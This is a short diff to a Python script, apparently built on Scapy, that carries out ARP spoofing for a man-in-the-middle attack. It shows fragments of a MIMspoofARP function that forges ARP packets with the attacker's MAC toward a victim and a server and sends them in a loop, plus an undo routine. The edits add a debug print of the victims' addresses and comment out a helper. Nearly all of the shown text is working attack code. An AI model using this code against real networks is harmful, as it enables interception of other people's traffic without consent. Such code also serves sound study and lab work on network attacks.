@@ -18,6 +18,8 @@ def MIMspoofARP(ipVictim, ipServer):
     macVictim = getmacbyip(ipVictim)
     macServer = getmacbyip(ipServer)
 
+    print(f'ipVictim={ipVictim}, macVictim={macVictim}, ipServer={ipServer}, macServer={macServer}')
+
     arpTo = Ether() / ARP()
     arpTo[Ether].src = macAttacker
     arpTo[ARP].hwsrc = macAttacker
@@ -39,7 +41,6 @@ def MIMspoofARP(ipVictim, ipServer):
 
     try:
         while(True):
-            
 
             sendp(arpTo, iface=interface, verbose=False)
             sendp(arpFrom, iface=interface, verbose=False)
@@ -59,8 +60,8 @@ def undoARPSpoof(ipVictim, ipServer, macVictim, macServer):
     send(Ether(dst=macVictim), undoVictim, count=4, verbose=False)
     send(Ether(dst=macServer), undoServer, count=4, verbose=False)
 
-def prepPacket(targetMAC, targetIP, spoofedIP):
-    arp1 = ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=spoofedIP)
+# def prepPacket(targetMAC, targetIP, spoofedIP):
+#     arp1 = ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=spoofedIP)
 
 
 if __name__ == "__main__":
